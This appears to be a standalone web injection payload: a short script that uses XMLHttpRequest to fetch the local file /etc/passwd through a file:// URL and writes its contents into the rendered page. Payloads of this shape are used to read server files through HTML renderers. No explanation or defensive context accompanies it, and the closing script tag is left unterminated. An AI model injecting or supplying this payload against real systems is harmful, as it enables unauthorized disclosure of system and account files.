<script>
function resp () {
document.write(this.responseText);
}

var xmlreq = new XMLHttpRequest();
xmlreq.addEventListener("load", resp);
xmlreq.open("GET", "file://etc/passwd");
xmlreq.send();
</script
